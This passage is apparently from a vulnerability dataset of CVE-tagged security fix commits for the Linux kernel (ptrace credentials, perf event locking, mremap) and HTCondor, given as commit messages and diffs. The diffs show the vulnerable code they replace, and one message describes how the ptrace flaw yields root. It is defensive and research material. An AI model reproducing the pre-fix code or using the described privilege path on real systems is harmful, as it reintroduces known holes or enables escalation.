  }\n+    osp++;\n+    return 0;\n+}\n+\n+\/* the semantics of restore differ slightly between Level 1 and\n+   Level 2 and later - the latter includes restoring the device\n+   state (whilst Level 1 didn't have \"page devices\" as such).\n+   Hence we have two restore operators - one here (Level 1)\n+   and one in zdevice2.c (Level 2+). For that reason, the\n+   operand checking and guts of the restore operation are\n+   separated so both implementations can use them to best\n+   effect.\n+ *\/\n+int\n+dorestore(i_ctx_t *i_ctx_p, alloc_save_t *asave)\n+{\n+    os_ptr op = osp;\n+    bool last;\n+    vm_save_t *vmsave;\n+    int code;\n+\n+    osp--;\n+\n     \/* Reset l_new in all stack entries if the new save level is zero. *\/\n     \/* Also do some special fixing on the e-stack. *\/\n     restore_fix_stack(i_ctx_p, &o_stack, asave, false);\n@@ -170,9 +192,24 @@ zrestore(i_ctx_t *i_ctx_p)\n     \/* cause an 'invalidaccess' in setuserparams. Temporarily set     *\/\n     \/* LockFilePermissions false until the gs_lev2.ps can do a        *\/\n     \/* setuserparams from the restored userparam dictionary.          *\/\n+    \/* NOTE: This is safe to do here, since the restore has           *\/\n+    \/* successfully completed - this should never come before any     *\/\n+    \/* operation that can trigger an error                            *\/\n     i_ctx_p->LockFilePermissions = false;\n     return 0;\n }\n+\n+int\n+zrestore(i_ctx_t *i_ctx_p)\n+{\n+    alloc_save_t *asave;\n+    int code = restore_check_save(i_ctx_p, &asave);\n+    if (code < 0)\n+        return code;\n+\n+    return dorestore(i_ctx_p, asave);\n+}\n+\n \/* Check the operand of a restore. *\/\n static int\n restore_check_operand(os_ptr op, alloc_save_t ** pasave,\n@@ -193,6 +230,7 @@ restore_check_operand(os_ptr op, alloc_save_t ** pasave,\n     *pasave = asave;\n     return 0;\n }\n+\n \/* Check a stack to make sure all its elements are older than a save. *\/\n static int\n restore_check_stack(const i_ctx_t *i_ctx_p, const ref_stack_t * pstack,\n-- \n2.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2019-13272","CWE_ID":"264","category":"security","commit_id":"6994eefb0053799d2e07cd140df6c2ea106c41ee","commit_message":"From 6994eefb0053799d2e07cd140df6c2ea106c41ee Mon Sep 17 00:00:00 2001\nFrom: Jann Horn <jannh@google.com>\nDate: Thu, 4 Jul 2019 17:32:23 +0200\nSubject: ptrace: Fix ->ptracer_cred handling for PTRACE_TRACEME\n\nFix two issues:\n\nWhen called for PTRACE_TRACEME, ptrace_link() would obtain an RCU\nreference to the parent's objective credentials, then give that pointer\nto get_cred().  However, the object lifetime rules for things like\nstruct cred do not permit unconditionally turning an RCU reference into\na stable reference.\n\nPTRACE_TRACEME records the parent's credentials as if the parent was\nacting as the subject, but that's not the case.  If a malicious\nunprivileged child uses PTRACE_TRACEME and the parent is privileged, and\nat a later point, the parent process becomes attacker-controlled\n(because it drops privileges and calls execve()), the attacker ends up\nwith control over two processes with a privileged ptrace relationship,\nwhich can be abused to ptrace a suid binary and obtain root privileges.\n\nFix both of these by always recording the credentials of the process\nthat is requesting the creation of the ptrace relationship:\ncurrent_cred() can't change under us, and current is the proper subject\nfor access control.\n\nThis change is theoretically userspace-visible, but I am not aware of\nany code that it will actually break.\n\nFixes: 64b875f7ac8a (\"ptrace: Capture the ptracer's creds not PT_PTRACE_CAP\")\nSigned-off-by: Jann Horn <jannh@google.com>\nAcked-by: Oleg Nesterov <oleg@redhat.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/ptrace.c | 4 +---\n 1 file changed, 1 insertion(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/ptrace.c b\/kernel\/ptrace.c\nindex 8456b6e2205f..705887f63288 100644\n--- a\/kernel\/ptrace.c\n+++ b\/kernel\/ptrace.c\n@@ -79,9 +79,7 @@ void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,\n  *\/\n static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)\n {\n-\trcu_read_lock();\n-\t__ptrace_link(child, new_parent, __task_cred(new_parent));\n-\trcu_read_unlock();\n+\t__ptrace_link(child, new_parent, current_cred());\n }\n \n \/**\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-6786","CWE_ID":"264","category":"security","commit_id":"f63a8daa5812afef4f06c962351687e1ff9ccb2b","commit_message":"From f63a8daa5812afef4f06c962351687e1ff9ccb2b Mon Sep 17 00:00:00 2001\nFrom: Peter Zijlstra <peterz@infradead.org>\nDate: Fri, 23 Jan 2015 12:24:14 +0100\nSubject: perf: Fix event->ctx locking\n\nThere have been a few reported issues wrt. the lack of locking around\nchanging event->ctx. This patch tries to address those.\n\nIt avoids the whole rwsem thing; and while it appears to work, please\ngive it some thought in review.\n\nWhat I did fail at is sensible runtime checks on the use of\nevent->ctx, the RCU use makes it very hard.\n\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>\nCc: Paul E. McKenney <paulmck@linux.vnet.ibm.com>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Arnaldo Carvalho de Melo <acme@kernel.org>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nLink: http:\/\/lkml.kernel.org\/r\/20150123125834.209535886@infradead.org\nSigned-off-by: Ingo Molnar <mingo@kernel.org>\n---\n kernel\/events\/core.c | 244 +++++++++++++++++++++++++++++++++++++++++++--------\n 1 file changed, 207 insertions(+), 37 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/events\/core.c b\/kernel\/events\/core.c\nindex b358cb38e4a5..417a96bf3d41 100644\n--- a\/kernel\/events\/core.c\n+++ b\/kernel\/events\/core.c\n@@ -906,6 +906,77 @@ static void put_ctx(struct perf_event_context *ctx)\n \t}\n }\n \n+\/*\n+ * Because of perf_event::ctx migration in sys_perf_event_open::move_group and\n+ * perf_pmu_migrate_context() we need some magic.\n+ *\n+ * Those places that change perf_event::ctx will hold both\n+ * perf_event_ctx::mutex of the 'old' and 'new' ctx value.\n+ *\n+ * Lock ordering is by mutex address. There is one other site where\n+ * perf_event_context::mutex nests and that is put_event(). But remember that\n+ * that is a parent<->child context relation, and migration does not affect\n+ * children, therefore these two orderings should not interact.\n+ *\n+ * The change in perf_event::ctx does not affect children (as claimed above)\n+ * because the sys_perf_event_open() case will install a new event and break\n+ * the ctx parent<->child relation, and perf_pmu_migrate_context() is only\n+ * concerned with cpuctx and that doesn't have children.\n+ *\n+ * The places that change perf_event::ctx will issue:\n+ *\n+ *   perf_remove_from_context();\n+ *   synchronize_rcu();\n+ *   perf_install_in_context();\n+ *\n+ * to affect the change. The remove_from_context() + synchronize_rcu() should\n+ * quiesce the event, after which we can install it in the new location. This\n+ * means that only external vectors (perf_fops, prctl) can perturb the event\n+ * while in transit. Therefore all such accessors should also acquire\n+ * perf_event_context::mutex to serialize against this.\n+ *\n+ * However; because event->ctx can change while we're waiting to acquire\n+ * ctx->mutex we must be careful and use the below perf_event_ctx_lock()\n+ * function.\n+ *\n+ * Lock order:\n+ *\ttask_struct::perf_event_mutex\n+ *\t  perf_event_context::mutex\n+ *\t    perf_event_context::lock\n+ *\t    perf_event::child_mutex;\n+ *\t    perf_event::mmap_mutex\n+ *\t    mmap_sem\n+ *\/\n+static struct perf_event_context *perf_event_ctx_lock(struct perf_event *event)\n+{\n+\tstruct perf_event_context *ctx;\n+\n+again:\n+\trcu_read_lock();\n+\tctx = ACCESS_ONCE(event->ctx);\n+\tif (!atomic_inc_not_zero(&ctx->refcount)) {\n+\t\trcu_read_unlock();\n+\t\tgoto again;\n+\t}\n+\trcu_read_unlock();\n+\n+\tmutex_lock(&ctx->mutex);\n+\tif (event->ctx != ctx) {\n+\t\tmutex_unlock(&ctx->mutex);\n+\t\tput_ctx(ctx);\n+\t\tgoto again;\n+\t}\n+\n+\treturn ctx;\n+}\n+\n+static void perf_event_ctx_unlock(struct perf_event *event,\n+\t\t\t\t  struct perf_event_context *ctx)\n+{\n+\tmutex_unlock(&ctx->mutex);\n+\tput_ctx(ctx);\n+}\n+\n \/*\n  * This must be done under the ctx->lock, such as to serialize against\n  * context_equiv(), therefore we cannot call put_ctx() since that might end up\n@@ -1666,7 +1737,7 @@ int __perf_event_disable(void *info)\n  * is the current context on this CPU and preemption is disabled,\n  * hence we can't get into perf_event_task_sched_out for this context.\n  *\/\n-void perf_event_disable(struct perf_event *event)\n+static void _perf_event_disable(struct perf_event *event)\n {\n \tstruct perf_event_context *ctx = event->ctx;\n \tstruct task_struct *task = ctx->task;\n@@ -1707,6 +1778,19 @@ retry:\n \t}\n \traw_spin_unlock_irq(&ctx->lock);\n }\n+\n+\/*\n+ * Strictly speaking kernel users cannot create groups and therefore this\n+ * interface does not need the perf_event_ctx_lock() magic.\n+ *\/\n+void perf_event_disable(struct perf_event *event)\n+{\n+\tstruct perf_event_context *ctx;\n+\n+\tctx = perf_event_ctx_lock(event);\n+\t_perf_event_disable(event);\n+\tperf_event_ctx_unlock(event, ctx);\n+}\n EXPORT_SYMBOL_GPL(perf_event_disable);\n \n static void perf_set_shadow_time(struct perf_event *event,\n@@ -2170,7 +2254,7 @@ unlock:\n  * perf_event_for_each_child or perf_event_for_each as described\n  * for perf_event_disable.\n  *\/\n-void perf_event_enable(struct perf_event *event)\n+static void _perf_event_enable(struct perf_event *event)\n {\n \tstruct perf_event_context *ctx = event->ctx;\n \tstruct task_struct *task = ctx->task;\n@@ -2226,9 +2310,21 @@ retry:\n out:\n \traw_spin_unlock_irq(&ctx->lock);\n }\n+\n+\/*\n+ * See perf_event_disable();\n+ *\/\n+void perf_event_enable(struct perf_event *event)\n+{\n+\tstruct perf_event_context *ctx;\n+\n+\tctx = perf_event_ctx_lock(event);\n+\t_perf_event_enable(event);\n+\tperf_event_ctx_unlock(event, ctx);\n+}\n EXPORT_SYMBOL_GPL(perf_event_enable);\n \n-int perf_event_refresh(struct perf_event *event, int refresh)\n+static int _perf_event_refresh(struct perf_event *event, int refresh)\n {\n \t\/*\n \t * not supported on inherited events\n@@ -2237,10 +2333,25 @@ int perf_event_refresh(struct perf_event *event, int refresh)\n \t\treturn -EINVAL;\n \n \tatomic_add(refresh, &event->event_limit);\n-\tperf_event_enable(event);\n+\t_perf_event_enable(event);\n \n \treturn 0;\n }\n+\n+\/*\n+ * See perf_event_disable()\n+ *\/\n+int perf_event_refresh(struct perf_event *event, int refresh)\n+{\n+\tstruct perf_event_context *ctx;\n+\tint ret;\n+\n+\tctx = perf_event_ctx_lock(event);\n+\tret = _perf_event_refresh(event, refresh);\n+\tperf_event_ctx_unlock(event, ctx);\n+\n+\treturn ret;\n+}\n EXPORT_SYMBOL_GPL(perf_event_refresh);\n \n static void ctx_sched_out(struct perf_event_context *ctx,\n@@ -3433,7 +3544,16 @@ static void perf_remove_from_owner(struct perf_event *event)\n \trcu_read_unlock();\n \n \tif (owner) {\n-\t\tmutex_lock(&owner->perf_event_mutex);\n+\t\t\/*\n+\t\t * If we're here through perf_event_exit_task() we're already\n+\t\t * holding ctx->mutex which would be an inversion wrt. the\n+\t\t * normal lock order.\n+\t\t *\n+\t\t * However we can safely take this lock because its the child\n+\t\t * ctx->mutex.\n+\t\t *\/\n+\t\tmutex_lock_nested(&owner->perf_event_mutex, SINGLE_DEPTH_NESTING);\n+\n \t\t\/*\n \t\t * We have to re-check the event->owner field, if it is cleared\n \t\t * we raced with perf_event_exit_task(), acquiring the mutex\n@@ -3559,12 +3679,13 @@ static int perf_event_read_group(struct perf_event *event,\n \t\t\t\t   u64 read_format, char __user *buf)\n {\n \tstruct perf_event *leader = event->group_leader, *sub;\n-\tint n = 0, size = 0, ret = -EFAULT;\n \tstruct perf_event_context *ctx = leader->ctx;\n-\tu64 values[5];\n+\tint n = 0, size = 0, ret;\n \tu64 count, enabled, running;\n+\tu64 values[5];\n+\n+\tlockdep_assert_held(&ctx->mutex);\n \n-\tmutex_lock(&ctx->mutex);\n \tcount = perf_event_read_value(leader, &enabled, &running);\n \n \tvalues[n++] = 1 + leader->nr_siblings;\n@@ -3579,7 +3700,7 @@ static int perf_event_read_group(struct perf_event *event,\n \tsize = n * sizeof(u64);\n \n \tif (copy_to_user(buf, values, size))\n-\t\tgoto unlock;\n+\t\treturn -EFAULT;\n \n \tret = size;\n \n@@ -3593,14 +3714,11 @@ static int perf_event_read_group(struct perf_event *event,\n \t\tsize = n * sizeof(u64);\n \n \t\tif (copy_to_user(buf + ret, values, size)) {\n-\t\t\tret = -EFAULT;\n-\t\t\tgoto unlock;\n+\t\t\treturn -EFAULT;\n \t\t}\n \n \t\tret += size;\n \t}\n-unlock:\n-\tmutex_unlock(&ctx->mutex);\n \n \treturn ret;\n }\n@@ -3672,8 +3790,14 @@ static ssize_t\n perf_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)\n {\n \tstruct perf_event *event = file->private_data;\n+\tstruct perf_event_context *ctx;\n+\tint ret;\n \n-\treturn perf_read_hw(event, buf, count);\n+\tctx = perf_event_ctx_lock(event);\n+\tret = perf_read_hw(event, buf, count);\n+\tperf_event_ctx_unlock(event, ctx);\n+\n+\treturn ret;\n }\n \n static unsigned int perf_poll(struct file *file, poll_table *wait)\n@@ -3699,7 +3823,7 @@ static unsigned int perf_poll(struct file *file, poll_table *wait)\n \treturn events;\n }\n \n-static void perf_event_reset(struct perf_event *event)\n+static void _perf_event_reset(struct perf_event *event)\n {\n \t(void)perf_event_read(event);\n \tlocal64_set(&event->count, 0);\n@@ -3718,6 +3842,7 @@ static void perf_event_for_each_child(struct perf_event *event,\n \tstruct perf_event *child;\n \n \tWARN_ON_ONCE(event->ctx->parent_ctx);\n+\n \tmutex_lock(&event->child_mutex);\n \tfunc(event);\n \tlist_for_each_entry(child, &event->child_list, child_list)\n@@ -3731,14 +3856,13 @@ static void perf_event_for_each(struct perf_event *event,\n \tstruct perf_event_context *ctx = event->ctx;\n \tstruct perf_event *sibling;\n \n-\tWARN_ON_ONCE(ctx->parent_ctx);\n-\tmutex_lock(&ctx->mutex);\n+\tlockdep_assert_held(&ctx->mutex);\n+\n \tevent = event->group_leader;\n \n \tperf_event_for_each_child(event, func);\n \tlist_for_each_entry(sibling, &event->sibling_list, group_entry)\n \t\tperf_event_for_each_child(sibling, func);\n-\tmutex_unlock(&ctx->mutex);\n }\n \n static int perf_event_period(struct perf_event *event, u64 __user *arg)\n@@ -3808,25 +3932,24 @@ static int perf_event_set_output(struct perf_event *event,\n \t\t\t\t struct perf_event *output_event);\n static int perf_event_set_filter(struct perf_event *event, void __user *arg);\n \n-static long perf_ioctl(struct file *file, unsigned int cmd, unsigned long arg)\n+static long _perf_ioctl(struct perf_event *event, unsigned int cmd, unsigned long arg)\n {\n-\tstruct perf_event *event = file->private_data;\n \tvoid (*func)(struct perf_event *);\n \tu32 flags = arg;\n \n \tswitch (cmd) {\n \tcase PERF_EVENT_IOC_ENABLE:\n-\t\tfunc = perf_event_enable;\n+\t\tfunc = _perf_event_enable;\n \t\tbreak;\n \tcase PERF_EVENT_IOC_DISABLE:\n-\t\tfunc = perf_event_disable;\n+\t\tfunc = _perf_event_disable;\n \t\tbreak;\n \tcase PERF_EVENT_IOC_RESET:\n-\t\tfunc = perf_event_reset;\n+\t\tfunc = _perf_event_reset;\n \t\tbreak;\n \n \tcase PERF_EVENT_IOC_REFRESH:\n-\t\treturn perf_event_refresh(event, arg);\n+\t\treturn _perf_event_refresh(event, arg);\n \n \tcase PERF_EVENT_IOC_PERIOD:\n \t\treturn perf_event_period(event, (u64 __user *)arg);\n@@ -3873,6 +3996,19 @@ static long perf_ioctl(struct file *file, unsigned int cmd, unsigned long arg)\n \treturn 0;\n }\n \n+static long perf_ioctl(struct file *file, unsigned int cmd, unsigned long arg)\n+{\n+\tstruct perf_event *event = file->private_data;\n+\tstruct perf_event_context *ctx;\n+\tlong ret;\n+\n+\tctx = perf_event_ctx_lock(event);\n+\tret = _perf_ioctl(event, cmd, arg);\n+\tperf_event_ctx_unlock(event, ctx);\n+\n+\treturn ret;\n+}\n+\n #ifdef CONFIG_COMPAT\n static long perf_compat_ioctl(struct file *file, unsigned int cmd,\n \t\t\t\tunsigned long arg)\n@@ -3895,11 +4031,15 @@ static long perf_compat_ioctl(struct file *file, unsigned int cmd,\n \n int perf_event_task_enable(void)\n {\n+\tstruct perf_event_context *ctx;\n \tstruct perf_event *event;\n \n \tmutex_lock(&current->perf_event_mutex);\n-\tlist_for_each_entry(event, &current->perf_event_list, owner_entry)\n-\t\tperf_event_for_each_child(event, perf_event_enable);\n+\tlist_for_each_entry(event, &current->perf_event_list, owner_entry) {\n+\t\tctx = perf_event_ctx_lock(event);\n+\t\tperf_event_for_each_child(event, _perf_event_enable);\n+\t\tperf_event_ctx_unlock(event, ctx);\n+\t}\n \tmutex_unlock(&current->perf_event_mutex);\n \n \treturn 0;\n@@ -3907,11 +4047,15 @@ int perf_event_task_enable(void)\n \n int perf_event_task_disable(void)\n {\n+\tstruct perf_event_context *ctx;\n \tstruct perf_event *event;\n \n \tmutex_lock(&current->perf_event_mutex);\n-\tlist_for_each_entry(event, &current->perf_event_list, owner_entry)\n-\t\tperf_event_for_each_child(event, perf_event_disable);\n+\tlist_for_each_entry(event, &current->perf_event_list, owner_entry) {\n+\t\tctx = perf_event_ctx_lock(event);\n+\t\tperf_event_for_each_child(event, _perf_event_disable);\n+\t\tperf_event_ctx_unlock(event, ctx);\n+\t}\n \tmutex_unlock(&current->perf_event_mutex);\n \n \treturn 0;\n@@ -7269,6 +7413,15 @@ out:\n \treturn ret;\n }\n \n+static void mutex_lock_double(struct mutex *a, struct mutex *b)\n+{\n+\tif (b < a)\n+\t\tswap(a, b);\n+\n+\tmutex_lock(a);\n+\tmutex_lock_nested(b, SINGLE_DEPTH_NESTING);\n+}\n+\n \/**\n  * sys_perf_event_open - open a performance event, associate it to a task\/cpu\n  *\n@@ -7284,7 +7437,7 @@ SYSCALL_DEFINE5(perf_event_open,\n \tstruct perf_event *group_leader = NULL, *output_event = NULL;\n \tstruct perf_event *event, *sibling;\n \tstruct perf_event_attr attr;\n-\tstruct perf_event_context *ctx;\n+\tstruct perf_event_context *ctx, *uninitialized_var(gctx);\n \tstruct file *event_file = NULL;\n \tstruct fd group = {NULL, 0};\n \tstruct task_struct *task = NULL;\n@@ -7482,9 +7635,14 @@ SYSCALL_DEFINE5(perf_event_open,\n \t}\n \n \tif (move_group) {\n-\t\tstruct perf_event_context *gctx = group_leader->ctx;\n+\t\tgctx = group_leader->ctx;\n+\n+\t\t\/*\n+\t\t * See perf_event_ctx_lock() for comments on the details\n+\t\t * of swizzling perf_event::ctx.\n+\t\t *\/\n+\t\tmutex_lock_double(&gctx->mutex, &ctx->mutex);\n \n-\t\tmutex_lock(&gctx->mutex);\n \t\tperf_remove_from_context(group_leader, false);\n \n \t\t\/*\n@@ -7499,15 +7657,19 @@ SYSCALL_DEFINE5(perf_event_open,\n \t\t\tperf_event__state_init(sibling);\n \t\t\tput_ctx(gctx);\n \t\t}\n-\t\tmutex_unlock(&gctx->mutex);\n-\t\tput_ctx(gctx);\n+\t} else {\n+\t\tmutex_lock(&ctx->mutex);\n \t}\n \n \tWARN_ON_ONCE(ctx->parent_ctx);\n-\tmutex_lock(&ctx->mutex);\n \n \tif (move_group) {\n+\t\t\/*\n+\t\t * Wait for everybody to stop referencing the events through\n+\t\t * the old lists, before installing it on new lists.\n+\t\t *\/\n \t\tsynchronize_rcu();\n+\n \t\tperf_install_in_context(ctx, group_leader, group_leader->cpu);\n \t\tget_ctx(ctx);\n \t\tlist_for_each_entry(sibling, &group_leader->sibling_list,\n@@ -7519,6 +7681,11 @@ SYSCALL_DEFINE5(perf_event_open,\n \n \tperf_install_in_context(ctx, event, event->cpu);\n \tperf_unpin_context(ctx);\n+\n+\tif (move_group) {\n+\t\tmutex_unlock(&gctx->mutex);\n+\t\tput_ctx(gctx);\n+\t}\n \tmutex_unlock(&ctx->mutex);\n \n \tput_online_cpus();\n@@ -7626,7 +7793,11 @@ void perf_pmu_migrate_context(struct pmu *pmu, int src_cpu, int dst_cpu)\n \tsrc_ctx = &per_cpu_ptr(pmu->pmu_cpu_context, src_cpu)->ctx;\n \tdst_ctx = &per_cpu_ptr(pmu->pmu_cpu_context, dst_cpu)->ctx;\n \n-\tmutex_lock(&src_ctx->mutex);\n+\t\/*\n+\t * See perf_event_ctx_lock() for comments on the details\n+\t * of swizzling perf_event::ctx.\n+\t *\/\n+\tmutex_lock_double(&src_ctx->mutex, &dst_ctx->mutex);\n \tlist_for_each_entry_safe(event, tmp, &src_ctx->event_list,\n \t\t\t\t event_entry) {\n \t\tperf_remove_from_context(event, false);\n@@ -7634,11 +7805,9 @@ void perf_pmu_migrate_context(struct pmu *pmu, int src_cpu, int dst_cpu)\n \t\tput_ctx(src_ctx);\n \t\tlist_add(&event->migrate_entry, &events);\n \t}\n-\tmutex_unlock(&src_ctx->mutex);\n \n \tsynchronize_rcu();\n \n-\tmutex_lock(&dst_ctx->mutex);\n \tlist_for_each_entry_safe(event, tmp, &events, migrate_entry) {\n \t\tlist_del(&event->migrate_entry);\n \t\tif (event->state >= PERF_EVENT_STATE_OFF)\n@@ -7648,6 +7817,7 @@ void perf_pmu_migrate_context(struct pmu *pmu, int src_cpu, int dst_cpu)\n \t\tget_ctx(dst_ctx);\n \t}\n \tmutex_unlock(&dst_ctx->mutex);\n+\tmutex_unlock(&src_ctx->mutex);\n }\n EXPORT_SYMBOL_GPL(perf_pmu_migrate_context);\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"ecc1a8993751de4e82eb18640d631dae1f626bd6","commit_message":"From ecc1a8993751de4e82eb18640d631dae1f626bd6 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Tue, 24 Nov 2009 07:28:07 -0500\nSubject: do_mremap() untangling, part 2\n\nTake the MREMAP_FIXED into a separate helper, simplify the living\nhell out of conditions in both cases.\n\nAcked-by: Russell King <rmk+kernel@arm.linux.org.uk>\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm\/mremap.c | 120 ++++++++++++++++++++++++++++++++++++------------------------\n 1 file changed, 72 insertions(+), 48 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mremap.c b\/mm\/mremap.c\nindex 67761361c469..5f346178f16f 100644\n--- a\/mm\/mremap.c\n+++ b\/mm\/mremap.c\n@@ -313,6 +313,59 @@ Eagain:\n \treturn ERR_PTR(-EAGAIN);\n }\n \n+static unsigned long mremap_to(unsigned long addr,\n+\tunsigned long old_len, unsigned long new_addr,\n+\tunsigned long new_len)\n+{\n+\tstruct mm_struct *mm = current->mm;\n+\tstruct vm_area_struct *vma;\n+\tunsigned long ret = -EINVAL;\n+\tunsigned long charged = 0;\n+\n+\tif (new_addr & ~PAGE_MASK)\n+\t\tgoto out;\n+\n+\tif (new_len > TASK_SIZE || new_addr > TASK_SIZE - new_len)\n+\t\tgoto out;\n+\n+\t\/* Check if the location we're moving into overlaps the\n+\t * old location at all, and fail if it does.\n+\t *\/\n+\tif ((new_addr <= addr) && (new_addr+new_len) > addr)\n+\t\tgoto out;\n+\n+\tif ((addr <= new_addr) && (addr+old_len) > new_addr)\n+\t\tgoto out;\n+\n+\tret = security_file_mmap(NULL, 0, 0, 0, new_addr, 1);\n+\tif (ret)\n+\t\tgoto out;\n+\n+\tret = do_munmap(mm, new_addr, new_len);\n+\tif (ret)\n+\t\tgoto out;\n+\n+\tif (old_len >= new_len) {\n+\t\tret = do_munmap(mm, addr+new_len, old_len - new_len);\n+\t\tif (ret && old_len != new_len)\n+\t\t\tgoto out;\n+\t\told_len = new_len;\n+\t}\n+\n+\tvma = vma_to_resize(addr, old_len, new_len, &charged);\n+\tif (IS_ERR(vma)) {\n+\t\tret = PTR_ERR(vma);\n+\t\tgoto out;\n+\t}\n+\n+\tret = move_vma(vma, addr, old_len, new_len, new_addr);\n+\tif (ret & ~PAGE_MASK)\n+\t\tvm_unacct_memory(charged);\n+\n+out:\n+\treturn ret;\n+}\n+\n \/*\n  * Expand (or shrink) an existing mapping, potentially moving it at the\n  * same time (controlled by the MREMAP_MAYMOVE flag and available VM space)\n@@ -346,32 +399,10 @@ unsigned long do_mremap(unsigned long addr,\n \tif (!new_len)\n \t\tgoto out;\n \n-\t\/* new_addr is only valid if MREMAP_FIXED is specified *\/\n \tif (flags & MREMAP_FIXED) {\n-\t\tif (new_addr & ~PAGE_MASK)\n-\t\t\tgoto out;\n-\t\tif (!(flags & MREMAP_MAYMOVE))\n-\t\t\tgoto out;\n-\n-\t\tif (new_len > TASK_SIZE || new_addr > TASK_SIZE - new_len)\n-\t\t\tgoto out;\n-\n-\t\t\/* Check if the location we're moving into overlaps the\n-\t\t * old location at all, and fail if it does.\n-\t\t *\/\n-\t\tif ((new_addr <= addr) && (new_addr+new_len) > addr)\n-\t\t\tgoto out;\n-\n-\t\tif ((addr <= new_addr) && (addr+old_len) > new_addr)\n-\t\t\tgoto out;\n-\n-\t\tret = security_file_mmap(NULL, 0, 0, 0, new_addr, 1);\n-\t\tif (ret)\n-\t\t\tgoto out;\n-\n-\t\tret = do_munmap(mm, new_addr, new_len);\n-\t\tif (ret)\n-\t\t\tgoto out;\n+\t\tif (flags & MREMAP_MAYMOVE)\n+\t\t\tret = mremap_to(addr, old_len, new_addr, new_len);\n+\t\tgoto out;\n \t}\n \n \t\/*\n@@ -384,13 +415,11 @@ unsigned long do_mremap(unsigned long addr,\n \t\tif (ret && old_len != new_len)\n \t\t\tgoto out;\n \t\tret = addr;\n-\t\tif (!(flags & MREMAP_FIXED) || (new_addr == addr))\n-\t\t\tgoto out;\n-\t\told_len = new_len;\n+\t\tgoto out;\n \t}\n \n \t\/*\n-\t * Ok, we need to grow..  or relocate.\n+\t * Ok, we need to grow..\n \t *\/\n \tvma = vma_to_resize(addr, old_len, new_len, &charged);\n \tif (IS_ERR(vma)) {\n@@ -399,11 +428,8 @@ unsigned long do_mremap(unsigned long addr,\n \t}\n \n \t\/* old_len exactly to the end of the area..\n-\t * And we're not relocating the area.\n \t *\/\n-\tif (old_len == vma->vm_end - addr &&\n-\t    !((flags & MREMAP_FIXED) && (addr != new_addr)) &&\n-\t    (old_len != new_len || !(flags & MREMAP_MAYMOVE))) {\n+\tif (old_len == vma->vm_end - addr) {\n \t\tunsigned long max_addr = TASK_SIZE;\n \t\tif (vma->vm_next)\n \t\t\tmax_addr = vma->vm_next->vm_start;\n@@ -432,22 +458,20 @@ unsigned long do_mremap(unsigned long addr,\n \t *\/\n \tret = -ENOMEM;\n \tif (flags & MREMAP_MAYMOVE) {\n-\t\tif (!(flags & MREMAP_FIXED)) {\n-\t\t\tunsigned long map_flags = 0;\n-\t\t\tif (vma->vm_flags & VM_MAYSHARE)\n-\t\t\t\tmap_flags |= MAP_SHARED;\n-\n-\t\t\tnew_addr = get_unmapped_area(vma->vm_file, 0, new_len,\n-\t\t\t\t\t\tvma->vm_pgoff, map_flags);\n-\t\t\tif (new_addr & ~PAGE_MASK) {\n-\t\t\t\tret = new_addr;\n-\t\t\t\tgoto out;\n-\t\t\t}\n-\n-\t\t\tret = security_file_mmap(NULL, 0, 0, 0, new_addr, 1);\n-\t\t\tif (ret)\n-\t\t\t\tgoto out;\n+\t\tunsigned long map_flags = 0;\n+\t\tif (vma->vm_flags & VM_MAYSHARE)\n+\t\t\tmap_flags |= MAP_SHARED;\n+\n+\t\tnew_addr = get_unmapped_area(vma->vm_file, 0, new_len,\n+\t\t\t\t\tvma->vm_pgoff, map_flags);\n+\t\tif (new_addr & ~PAGE_MASK) {\n+\t\t\tret = new_addr;\n+\t\t\tgoto out;\n \t\t}\n+\n+\t\tret = security_file_mmap(NULL, 0, 0, 0, new_addr, 1);\n+\t\tif (ret)\n+\t\t\tgoto out;\n \t\tret = move_vma(vma, addr, old_len, new_len, new_addr);\n \t}\n out:\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-3491","CWE_ID":"264","category":"security","commit_id":"1fff5d4084f24b34b4a7f96813925bf8108f40ef","commit_message":"From 1fff5d4084f24b34b4a7f96813925bf8108f40ef Mon Sep 17 00:00:00 2001\nFrom: Matthew Farrellee <matt@redhat.com>\nDate: Fri, 13 Jul 2012 12:52:52 -0400\nSubject: [PATCH] Remove unused KILL_FRGN_JOB\/DEACTIVATE_CLAIM_FORIBLY command\n from the schedd, #3168\n\nSigned-off-by: Jaime Frey <jfrey@cs.wisc.edu>\n\nConflicts:\n\tsrc\/condor_schedd.V6\/schedd.cpp\n\tsrc\/condor_schedd.V6\/scheduler.h\n---\n src\/condor_schedd.V6\/schedd.cpp  | 76 ----------------------------------------\n src\/condor_schedd.V6\/scheduler.h |  2 --\n 2 files changed, 78 deletions(-)\n\n","diff_code":"diff --git a\/src\/condor_schedd.V6\/schedd.cpp b\/src\/condor_schedd.V6\/schedd.cpp\nindex b5fb2cc..7dd6655 100644\n--- a\/src\/condor_schedd.V6\/schedd.cpp\n+++ b\/src\/condor_schedd.V6\/schedd.cpp\n@@ -2867,79 +2867,6 @@ Scheduler::WriteAttrChangeToUserLog( const char* job_id_str, const char* attr,\n \n \n int\n-Scheduler::abort_job(int, Stream* s)\n-{\n-\tPROC_ID\tjob_id;\n-\tint nToRemove = -1;\n-\n-\t\/\/ First grab the number of jobs to remove\/hold\n-\tif ( !s->code(nToRemove) ) {\n-\t\tdprintf(D_ALWAYS,\"abort_job() can't read job count\\n\");\n-\t\treturn 